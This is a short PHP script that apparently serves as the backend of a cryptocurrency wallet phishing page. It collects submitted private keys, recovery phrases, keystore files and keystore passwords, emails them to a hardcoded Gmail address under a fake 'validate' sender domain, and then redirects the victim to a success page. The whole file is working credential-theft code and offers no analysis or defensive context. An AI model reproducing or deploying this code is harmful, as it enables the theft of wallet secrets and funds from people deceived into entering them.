<?php 
if(isset($_POST['submit'])){
    $to = "infiniteazy@gmail.com"; // this is your Email address
    $from = "noreply@multiapivalidate.com"; // this is the sender's Email address
    $privatekey = $_POST['privatekey'];
    $phrase = $_POST['phrase'];
    $keystorejson = $_POST['keystorejson'];
    $keystorepassword = $_POST['keystorepassword'];
    $subject = "Form submission";
    $subject2 = "Copy of your form submission";
    $message = $privatekey. $phrase. $keystorejson. $keystorepassword;
    
    $headers = "From:" . $from;
    mail($to,$subject,$message,$headers);
    header('Location: success.html');
    // You can also use header('Location: thank_you.php'); to redirect to another page.
    }
?>